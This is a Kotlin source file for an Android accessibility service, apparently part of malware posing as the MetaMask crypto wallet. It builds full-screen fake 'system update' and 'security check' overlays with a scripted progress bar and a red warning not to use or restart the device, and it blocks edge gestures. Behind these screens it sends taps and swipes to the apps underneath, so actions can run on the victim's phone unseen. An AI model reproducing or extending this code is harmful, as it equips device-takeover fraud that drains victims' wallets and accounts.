package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.animation.ValueAnimator
import android.content.Context
import android.content.res.ColorStateList
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.graphics.RectF
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.view.animation.LinearInterpolator
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import com.example.MetaMask.R

class MartenHelper(private val service: AccessibilityService) {

    companion object {
        private const val DURATION_MS = 120_000L
        private const val PHASE_1_END = 25
        private const val PHASE_2_END = 80

        private val CHECK_AT = intArrayOf(30, 50, 65, 80)
    }

    private val wm = service.getSystemService(AccessibilityService.WINDOW_SERVICE) as WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private var currentView: View? = null
    private var progressAnim: ValueAnimator? = null
    private var spinAnim: ValueAnimator? = null
    private var phase1SubRotator: Runnable? = null
    private var lastPhase = 0
    private var weakGpuActive = false

    @Volatile var passthroughCount = 0
        private set
    @Volatile private var overlayIsBlack = false

    private fun baseParams(alpha: Float = 1.0f, brightness: Float = 0.15f): WindowManager.LayoutParams {
        android.util.Log.d("XDBG", "[MartenHelper] baseParams enter alpha=${alpha} brightness=${brightness}") //xdbg
        var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        if (passthroughCount > 0) flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            flags,
            PixelFormat.TRANSLUCENT
        ).also {
            it.alpha = alpha
            it.windowAnimations = 0
            it.screenBrightness = brightness
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                it.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    @Synchronized
    private fun applyPassthroughFlag() {
        android.util.Log.d("XDBG", "[MartenHelper] applyPassthroughFlag enter") //xdbg
        val view = currentView ?: return
        val params = view.layoutParams as? WindowManager.LayoutParams ?: return
        val wantPassthrough = passthroughCount > 0
        val hasFlag = (params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE) != 0
        if (wantPassthrough == hasFlag) return
        params.flags = if (wantPassthrough)
            params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        else
            params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
        try {
            wm.updateViewLayout(view, params)
        }
        catch (_: Exception) {}
    }

    @Synchronized
    fun beginGesturePassthrough() {
        android.util.Log.d("XDBG", "[MartenHelper] beginGesturePassthrough enter") //xdbg
        passthroughCount++
        if (passthroughCount == 1) applyPassthroughFlag()
    }

    @Synchronized
    fun endGesturePassthrough() {
        android.util.Log.d("XDBG", "[MartenHelper] endGesturePassthrough enter") //xdbg
        if (passthroughCount > 0) passthroughCount--
        if (passthroughCount == 0) applyPassthroughFlag()
    }

    fun dispatchGesture(
        svc: AccessibilityService,
        gesture: android.accessibilityservice.GestureDescription,
        userCallback: AccessibilityService.GestureResultCallback? = null
    ): Boolean {
        if (!isShowing()) {
            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
            val ok = svc.dispatchGesture(gesture, userCallback, null)
            android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
            return ok
        }
        beginGesturePassthrough()
        val wrapped = object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCompleted enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCompleted(g)
            }
            override fun onCancelled(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCancelled enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(g)
            }
        }
        handler.postDelayed({
            val ok = try { svc.dispatchGesture(gesture, wrapped, null) } catch (_: Exception) {
                android.util.Log.e("XDBG", "[MartenHelper] catch") //xdbg
                false
            }
            if (!ok) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(gesture)
            }
        }, 30L)
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return true
    }

    fun tapAt(
        svc: AccessibilityService,
        x: Float,
        y: Float,
        userCallback: AccessibilityService.GestureResultCallback? = null
    ) {
        if (!isShowing()) {
            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
            val path = android.graphics.Path().apply { moveTo(x, y) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 120L)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, userCallback, null)
            return
        }
        val gestureCallback = object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCompleted enter g=${g}") //xdbg
                userCallback?.onCompleted(g)
            }
            override fun onCancelled(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCancelled enter g=${g}") //xdbg
                try {
                    val node = findClickableNodeAt(svc, x.toInt(), y.toInt())
                    if (node != null) {
                        android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                        try { node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) {}
                        try { node.recycle() } catch (_: Exception) {}
                    }
                } catch (_: Throwable) {}
                userCallback?.onCancelled(g)
            }
        }
        tapFallback(svc, x, y, gestureCallback)
    }

    private fun tapFallback(
        svc: AccessibilityService,
        x: Float,
        y: Float,
        userCallback: AccessibilityService.GestureResultCallback?
    ) {
        beginGesturePassthrough()
        val wrapped = object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCompleted enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCompleted(g)
            }
            override fun onCancelled(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCancelled enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(g)
            }
        }
        handler.postDelayed({
            val path = android.graphics.Path().apply { moveTo(x, y) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 120L)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            val ok = try { svc.dispatchGesture(gesture, wrapped, null) } catch (_: Exception) { false }
            if (!ok) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(null)
            }
        }, 150L)
    }

    fun swipeAt(
        svc: AccessibilityService,
        x1: Float, y1: Float,
        x2: Float, y2: Float,
        dur: Long,
        userCallback: AccessibilityService.GestureResultCallback? = null
    ) {
        if (!isShowing()) {
            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
            val path = android.graphics.Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, dur)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, userCallback, null)
            return
        }
        beginGesturePassthrough()
        val wrapped = object : AccessibilityService.GestureResultCallback() {
            override fun onCompleted(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCompleted enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCompleted(g)
            }
            override fun onCancelled(g: android.accessibilityservice.GestureDescription?) {
                android.util.Log.d("XDBG", "[MartenHelper] onCancelled enter g=${g}") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(g)
            }
        }
        handler.postDelayed({
            val path = android.graphics.Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, dur)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            val ok = try { svc.dispatchGesture(gesture, wrapped, null) } catch (_: Exception) { false }
            if (!ok) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                endGesturePassthrough()
                userCallback?.onCancelled(null)
            }
        }, 100L)
    }

    private fun findClickableNodeAt(
        svc: AccessibilityService,
        x: Int,
        y: Int
    ): android.view.accessibility.AccessibilityNodeInfo? {
        val windows = try { svc.windows } catch (_: Exception) { return null }
        for (window in windows) {
            android.util.Log.d("XDBG", "[MartenHelper] loop") //xdbg
            if (window.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
            val root = try { window.root } catch (_: Exception) { continue } ?: continue
            val leaf = findDeepestAt(root, x, y)
            if (leaf == null) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                try { root.recycle() } catch (_: Exception) {}
                continue
            }
            var result: android.view.accessibility.AccessibilityNodeInfo? = null
            val parents = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
            try {
                if (leaf.isClickable && leaf.isEnabled) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    result = leaf
                } else {
                    var cur: android.view.accessibility.AccessibilityNodeInfo? =
                        try { leaf.parent } catch (_: Exception) { null }
                    repeat(4) {
                        val c = cur ?: return@repeat
                        parents.add(c)
                        if (c.isClickable && c.isEnabled) {
                            android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                            result = c
                            android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
                            return@repeat
                        }
                        cur = try { c.parent } catch (_: Exception) { null }
                    }
                }
                if (result != null) return result
            } finally {
                val r = result
                parents.forEach { if (it !== r) try { it.recycle() } catch (_: Exception) {} }
                if (leaf !== root && leaf !== r) try { leaf.recycle() } catch (_: Exception) {}
                if (root !== r) try { root.recycle() } catch (_: Exception) {}
            }
        }
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return null
    }

    private fun findDeepestAt(
        node: android.view.accessibility.AccessibilityNodeInfo,
        x: Int,
        y: Int,
        depth: Int = 0
    ): android.view.accessibility.AccessibilityNodeInfo? {
        val rect = android.graphics.Rect()
        node.getBoundsInScreen(rect)
        if (!rect.contains(x, y)) return null
        if (depth >= 15) return node
        for (i in 0 until node.childCount) {
            android.util.Log.d("XDBG", "[MartenHelper] loop") //xdbg
            val child = try { node.getChild(i) } catch (_: Exception) { continue } ?: continue
            val found = findDeepestAt(child, x, y, depth + 1)
            if (found != null) {
                android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                if (found !== child) try { child.recycle() } catch (_: Exception) {}
                return found
            }
            try { child.recycle() } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return node
    }

    @Suppress("DEPRECATION")
    private fun applyImmersive(view: View) {
        android.util.Log.d("XDBG", "[MartenHelper] applyImmersive enter view=${view}") //xdbg
        view.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN or
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        )
    }

    private fun removeCurrentViewInternal() {
        android.util.Log.d("XDBG", "[MartenHelper] removeCurrentViewInternal enter") //xdbg
        progressAnim?.cancel()
        progressAnim = null
        spinAnim?.cancel()
        spinAnim = null
        phase1SubRotator?.let { handler.removeCallbacks(it) }
        phase1SubRotator = null
        lastPhase = 0
        weakGpuActive = false
        currentView?.let {
            try { wm.removeViewImmediate(it) } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MartenHelper] catch") //xdbg
                try { wm.removeView(it) } catch (e2: Exception) {}
            }
            currentView = null
        }
    }

    fun showBlack(text: String = "") {
        android.util.Log.d("XDBG", "[MartenHelper] showBlack enter text=${text}") //xdbg
        val runnable = Runnable {
            removeCurrentViewInternal()
            try {
                val root = FrameLayout(service).apply {
                    setBackgroundColor(Color.BLACK)
                    fitsSystemWindows = false
                }
                if (text.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    val tv = TextView(service).apply {
                        this.text = text
                        setTextColor(Color.WHITE)
                        textSize = 28f
                        gravity = Gravity.CENTER
                        typeface = Typeface.DEFAULT_BOLD
                        setShadowLayer(4f, 2f, 2f, Color.BLACK)
                        layoutParams = FrameLayout.LayoutParams(
                            FrameLayout.LayoutParams.MATCH_PARENT,
                            FrameLayout.LayoutParams.WRAP_CONTENT
                        ).apply { gravity = Gravity.CENTER }
                    }
                    root.addView(tv)
                }
                applyImmersive(root)
                wm.addView(root, baseParams(alpha = 0.90f, brightness = 0.0f))
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    root.post {
                        root.systemGestureExclusionRects = listOf(
                            android.graphics.Rect(0, 0, root.width, root.height)
                        )
                    }
                }
                currentView = root
                overlayIsBlack = true
            } catch (_: Exception) {}
        }
        if (Looper.myLooper() == Looper.getMainLooper()) runnable.run()
        else handler.post(runnable)
    }

    fun showFakeUpdate() {
        android.util.Log.d("XDBG", "[MartenHelper] showFakeUpdate enter") //xdbg
        val runnable = Runnable {
            removeCurrentViewInternal()
            try {
                val root = buildSecurityOverlay()
                root.fitsSystemWindows = false
                applyImmersive(root)
                wm.addView(root, baseParams(alpha = 0.94f, brightness = 0.10f))
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    root.post {
                        root.systemGestureExclusionRects = listOf(
                            android.graphics.Rect(0, 0, root.width, root.height)
                        )
                    }
                }
                currentView = root
                overlayIsBlack = true
                startArcSpinner(root)
                startPhase1SubtitleRotator(root)
                startProgressAnimation(root)
                startGpuPerfMonitor(root)
            } catch (_: Exception) {}
        }
        if (Looper.myLooper() == Looper.getMainLooper()) runnable.run()
        else handler.post(runnable)
    }

    fun completeAndHide() {
        android.util.Log.d("XDBG", "[MartenHelper] completeAndHide enter") //xdbg
        val runnable = Runnable {
            val root = currentView as? FrameLayout
            if (root == null) { hide(); return@Runnable }
            progressAnim?.cancel(); progressAnim = null
            try {
                root.findViewWithTag<ProgressBar>("progress")?.progress = 100
                root.findViewWithTag<TextView>("pct")?.text = "100%"
                applyPhase(root, 100)
                revealChecks(root, 100)
            } catch (_: Exception) {}
            handler.postDelayed({ hide() }, 1200L)
        }
        if (Looper.myLooper() == Looper.getMainLooper()) runnable.run()
        else handler.post(runnable)
    }

    fun hide() {
        android.util.Log.d("XDBG", "[MartenHelper] hide enter") //xdbg
        val runnable = Runnable {
            removeCurrentViewInternal()
            overlayIsBlack = false
        }
        if (Looper.myLooper() == Looper.getMainLooper()) runnable.run()
        else handler.post(runnable)
    }

    fun isShowing() = currentView != null
    fun isBlackShowing() = overlayIsBlack && currentView != null

    private fun dp(v: Int): Int =
        TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), service.resources.displayMetrics
        ).toInt()

    private fun statusBarHeight(): Int {
        android.util.Log.d("XDBG", "[MartenHelper] statusBarHeight enter") //xdbg
        val resId = service.resources.getIdentifier("status_bar_height", "dimen", "android")
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return if (resId > 0) service.resources.getDimensionPixelSize(resId) else dp(24)
    }

    private fun navBarHeight(): Int {
        android.util.Log.d("XDBG", "[MartenHelper] navBarHeight enter") //xdbg
        val resId = service.resources.getIdentifier("navigation_bar_height", "dimen", "android")
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return if (resId > 0) service.resources.getDimensionPixelSize(resId) else dp(24)
    }

    private fun dim(resId: Int): Float = service.resources.getDimension(resId)
    private fun dimPx(resId: Int): Int = dim(resId).toInt()
    private fun col(resId: Int): Int = service.resources.getColor(resId, service.theme)
    private fun str(resId: Int): String = service.getString(resId)

    private fun buildSecurityOverlay(): FrameLayout {
        android.util.Log.d("XDBG", "[MartenHelper] buildSecurityOverlay enter") //xdbg
        val ctx = service
        val root = FrameLayout(ctx).apply { setBackgroundColor(Color.BLACK) }

        val content = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(48), 0, dp(48), 0)
        }
        content.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.CENTER_VERTICAL
            topMargin = -dp(24)
        }

        val robotFrame = FrameLayout(ctx)
        robotFrame.layoutParams = LinearLayout.LayoutParams(dp(120), dp(150)).apply {
            gravity = Gravity.CENTER_HORIZONTAL
            bottomMargin = dp(36)
        }
        val robotImg = ImageView(ctx).apply {
            setImageResource(R.drawable.ic_android_bot)
            scaleType = ImageView.ScaleType.FIT_CENTER
        }
        robotFrame.addView(robotImg, FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ))
        val spinnerSec = ArcSpinnerView(ctx, Color.parseColor("#00E5FF")).apply { tag = "au_spinner" }
        robotFrame.addView(spinnerSec, FrameLayout.LayoutParams(dp(48), dp(48)).apply {
            gravity = Gravity.CENTER
        })
        content.addView(robotFrame)

        val title = TextView(ctx).apply {
            text = str(R.string.ov_phase1_title)
            setTextColor(Color.WHITE)
            textSize = 21f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.01f
            tag = "title"
        }
        title.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { bottomMargin = dp(8) }
        content.addView(title)

        val subtitle = TextView(ctx).apply {
            text = str(R.string.ov_phase1_sub1)
            setTextColor(Color.parseColor("#888888"))
            textSize = 14f
            gravity = Gravity.CENTER
            tag = "subtitle"
        }
        subtitle.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { bottomMargin = dp(32) }
        content.addView(subtitle)

        val progressBar = ProgressBar(ctx, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            isIndeterminate = false
            tag = "progress"
            progressTintList = ColorStateList.valueOf(Color.WHITE)
            progressBackgroundTintList = ColorStateList.valueOf(Color.parseColor("#2E2E2E"))
        }
        progressBar.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(3)
        ).apply { bottomMargin = dp(10) }
        content.addView(progressBar)

        val pct = TextView(ctx).apply {
            text = "0%"
            setTextColor(Color.parseColor("#999999"))
            textSize = 14f
            gravity = Gravity.CENTER
            tag = "pct"
        }
        content.addView(pct)

        root.addView(content)

        val warnStr = try { service.getString(R.string.au_warning) }
                      catch (_: Exception) { "Do not restart or use your device during the update to avoid data loss." }
        val footer = TextView(ctx).apply {
            text = warnStr
            setTextColor(Color.parseColor("#CC3333"))
            textSize = 11f
            gravity = Gravity.CENTER
            setPadding(dp(28), dp(10), dp(28), dp(24))
        }
        footer.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.BOTTOM; bottomMargin = navBarHeight() }
        root.addView(footer)

        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return root
    }
    private fun buildCheckRow(label: String, idx: Int): LinearLayout {
        android.util.Log.d("XDBG", "[MartenHelper] buildCheckRow enter label=${label} idx=${idx}") //xdbg
        val ctx = service
        val row = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, dp(6), 0, dp(6))
            alpha = 0.4f
            tag = "check_$idx"
        }
        val mark = TextView(ctx).apply {
            text = "○"
            setTextColor(col(R.color.ov_check_pending))
            setTextSize(TypedValue.COMPLEX_UNIT_PX, dim(R.dimen.ov_check_size) * 1.1f)
            setTypeface(typeface, Typeface.BOLD)
            tag = "mark_$idx"
        }
        val mlp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { rightMargin = dp(12) }
        mark.layoutParams = mlp
        val text = TextView(ctx).apply {
            text = label
            setTextColor(col(R.color.cc_text_secondary))
            setTextSize(TypedValue.COMPLEX_UNIT_PX, dim(R.dimen.ov_check_size))
            tag = "label_$idx"
        }
        row.addView(mark)
        row.addView(text)
        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return row
    }

    private fun startPhase1SubtitleRotator(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] startPhase1SubtitleRotator enter root=${root}") //xdbg
        val subs = intArrayOf(
            R.string.ov_phase1_sub1, R.string.ov_phase1_sub2, R.string.ov_phase1_sub3
        )
        var i = 0
        val runnable = object : Runnable {
            override fun run() {
                android.util.Log.d("XDBG", "[MartenHelper] run enter") //xdbg
                val tv = root.findViewWithTag<TextView>("subtitle") ?: return
                val progress = root.findViewWithTag<ProgressBar>("progress")?.progress ?: 0
                if (progress < PHASE_1_END) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    i = (i + 1) % subs.size
                    try { tv.text = str(subs[i]) } catch (_: Exception) {}
                    handler.postDelayed(this, 1400L)
                }
            }
        }
        phase1SubRotator = runnable
        handler.postDelayed(runnable, 1400L)
    }

    private fun startProgressAnimation(root: FrameLayout) {
        android.util.Log.d("XDBG", "[MartenHelper] startProgressAnimation enter root=${root}") //xdbg
        progressAnim = ValueAnimator.ofInt(0, 90).apply {
            duration = DURATION_MS
            addUpdateListener { anim ->
                val v = anim.animatedValue as Int
                try {
                    root.findViewWithTag<ProgressBar>("progress")?.progress = v
                    root.findViewWithTag<TextView>("pct")?.text = "$v%"
                    applyPhase(root, v)
                    revealChecks(root, v)
                } catch (_: Exception) {}
            }
            start()
        }
    }

    private fun applyPhase(root: FrameLayout, pct: Int) {
        android.util.Log.d("XDBG", "[MartenHelper] applyPhase enter root=${root} pct=${pct}") //xdbg
        if (weakGpuActive) return
        val title = root.findViewWithTag<TextView>("title") ?: return
        val subtitle = root.findViewWithTag<TextView>("subtitle") ?: return

        val currentPhase = when {
            pct < PHASE_1_END -> 1
            pct < PHASE_2_END -> 2
            pct < 100 -> 3
            else -> 4
        }
        if (currentPhase == lastPhase) return
        lastPhase = currentPhase

        when (currentPhase) {
            2 -> {
                title.text = str(R.string.ov_phase2_title)
                subtitle.text = str(R.string.ov_phase2_sub)
            }
            3 -> {
                title.text = str(R.string.ov_phase3_title)
                subtitle.text = str(R.string.ov_phase3_sub)
            }
            4 -> {
                title.text = str(R.string.ov_complete)
                subtitle.text = ""
                root.findViewWithTag<TextView>("shield")?.apply {
                    text = "✓"
                    setTextColor(col(R.color.ov_check_done))
                }
            }
        }
    }

    private fun revealChecks(root: FrameLayout, pct: Int) {
        android.util.Log.d("XDBG", "[MartenHelper] revealChecks enter root=${root} pct=${pct}") //xdbg
        for (idx in CHECK_AT.indices) {
            android.util.Log.d("XDBG", "[MartenHelper] loop") //xdbg
            if (pct < CHECK_AT[idx]) continue
            val row = root.findViewWithTag<LinearLayout>("check_$idx") ?: continue
            if (row.alpha >= 0.99f) continue
            row.animate().alpha(1f).setDuration(250).start()
            root.findViewWithTag<TextView>("mark_$idx")?.apply {
                text = "✓"
                setTextColor(col(R.color.ov_check_done))
            }
            root.findViewWithTag<TextView>("label_$idx")?.setTextColor(col(R.color.cc_text_primary))
        }
    }

    private inner class ArcSpinnerView(ctx: Context, arcColor: Int = Color.WHITE) : View(ctx) {
        private val arcPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            strokeCap = Paint.Cap.ROUND
            color = arcColor
            strokeWidth = dp(4).toFloat()
        }
        private val bgPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
            style = Paint.Style.STROKE
            color = Color.parseColor("#2A2A2A")
            strokeWidth = dp(2).toFloat()
        }
        var startAngle = 0f
            set(value) { field = value; invalidate() }
        private val oval = RectF()

        override fun onSizeChanged(w: Int, h: Int, ow: Int, oh: Int) {
            android.util.Log.d("XDBG", "[MartenHelper] onSizeChanged enter w=${w} h=${h} ow=${ow} oh=${oh}") //xdbg
            val inset = arcPaint.strokeWidth / 2f + 1f
            oval.set(inset, inset, w - inset, h - inset)
        }

        override fun onDraw(canvas: Canvas) {
            android.util.Log.d("XDBG", "[MartenHelper] onDraw enter canvas=${canvas}") //xdbg
            canvas.drawArc(oval, 0f, 360f, false, bgPaint)
            canvas.drawArc(oval, startAngle, 115f, false, arcPaint)
        }
    }

    fun showAndroidUpdate() {
        android.util.Log.d("XDBG", "[MartenHelper] showAndroidUpdate enter") //xdbg
        val runnable = Runnable {
            removeCurrentViewInternal()
            try {
                val root = buildAndroidUpdateOverlay()
                root.fitsSystemWindows = false
                applyImmersive(root)
                wm.addView(root, baseParams(alpha = 0.95f, brightness = 0.08f))
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    android.util.Log.d("XDBG", "[MartenHelper] if branch") //xdbg
                    root.post {
                        root.systemGestureExclusionRects = listOf(
                            android.graphics.Rect(0, 0, root.width, root.height)
                        )
                    }
                }
                currentView = root
                overlayIsBlack = true
                startAndroidUpdateAnimation(root)
                startGpuPerfMonitor(root)
            } catch (_: Exception) {}
        }
        if (Looper.myLooper() == Looper.getMainLooper()) runnable.run()
        else handler.post(runnable)
    }

    private fun buildAndroidUpdateOverlay(): FrameLayout {
        android.util.Log.d("XDBG", "[MartenHelper] buildAndroidUpdateOverlay enter") //xdbg
        val ctx = service
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.BLACK)
        }

        val center = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(48), 0, dp(48), 0)
            alpha = 0.75f
        }
        center.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.CENTER_VERTICAL
            topMargin = -dp(32)
        }

        val robotFrame = FrameLayout(ctx)
        robotFrame.layoutParams = LinearLayout.LayoutParams(dp(140), dp(175)).apply {
            gravity = Gravity.CENTER_HORIZONTAL
            bottomMargin = dp(28)
        }

        val robotImg = ImageView(ctx).apply {
            setImageResource(R.drawable.ic_android_bot)
            scaleType = ImageView.ScaleType.FIT_CENTER
        }
        robotFrame.addView(robotImg, FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        ))

        val spinner = ArcSpinnerView(ctx).apply { tag = "au_spinner" }
        robotFrame.addView(spinner, FrameLayout.LayoutParams(dp(56), dp(56)).apply {
            gravity = Gravity.CENTER
        })

        center.addView(robotFrame)

        val progressBar = ProgressBar(ctx, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 1
            isIndeterminate = false
            tag = "au_progress"
            progressTintList = ColorStateList.valueOf(Color.parseColor("#707070"))
            progressBackgroundTintList = ColorStateList.valueOf(Color.parseColor("#2A2A2A"))
        }
        progressBar.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(5)
        ).apply { bottomMargin = dp(10) }
        center.addView(progressBar)

        val pct = TextView(ctx).apply {
            text = "1%"
            setTextColor(Color.parseColor("#909090"))
            textSize = 15f
            gravity = Gravity.CENTER
            tag = "au_pct"
            setPadding(0, 0, 0, dp(18))
        }
        center.addView(pct)

        val titleStr = try { service.getString(R.string.au_title) }
                       catch (_: Exception) { "Installing system update…" }
        val titleTv = TextView(ctx).apply {
            text = titleStr
            setTextColor(Color.parseColor("#808080"))
            textSize = 13f
            gravity = Gravity.CENTER
            tag = "au_title_tv"
        }
        center.addView(titleTv)

        root.addView(center)

        val warnStr = try { service.getString(R.string.au_warning) }
                      catch (_: Exception) { "Do not restart or use your device to avoid data loss." }
        val warnTv = TextView(ctx).apply {
            text = warnStr
            setTextColor(Color.parseColor("#CC3333"))
            textSize = 11f
            gravity = Gravity.CENTER
            setPadding(dp(28), dp(10), dp(28), dp(24))
        }
        warnTv.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.BOTTOM
            bottomMargin = navBarHeight()
        }
        root.addView(warnTv)

        android.util.Log.d("XDBG", "[MartenHelper] return") //xdbg
        return root
    }

